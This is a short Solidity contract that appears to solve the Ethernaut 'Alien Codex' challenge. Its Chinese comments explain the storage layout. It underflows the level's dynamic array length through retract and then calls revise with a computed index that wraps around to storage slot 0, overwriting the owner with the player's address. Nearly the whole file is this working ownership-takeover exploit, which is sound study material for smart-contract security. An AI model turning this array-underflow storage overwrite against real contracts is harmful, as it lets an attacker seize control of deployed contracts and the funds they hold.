// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;
import "hardhat/console.sol";

interface ILevel{
  function owner() external view returns (address);
  function make_contact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}

contract AlienCodexRun {
  
  function run(address _runAddress,address _playerAddress) external payable {
    ILevel level = ILevel(_runAddress);
    level.make_contact();
    //先回退,0.5版本会溢出，数组长度变很长
    level.retract();
    /**
        Slot                  Data
        ------------------------------
        0                     owner, contact
        1                     codex.length      #p = 1
        .
        .
        keccak256(p)          codex[0]     
        keccak256(p) + 1      codex[1]
        .
        .
        keccak256(p) + index  codex[index]
.
     */   
    bytes32 arrSlot = keccak256(abi.encodePacked(uint256(1)));    
    uint256 gap = (type(uint256).max - uint256(arrSlot)) + 1;
    //传入GAP会导致arrSlot+gag溢出后=0，即设置slot:0,这个位置用于存owner和bool contact
    level.revise(gap, bytes32(uint256(uint160(_playerAddress))));
  }
}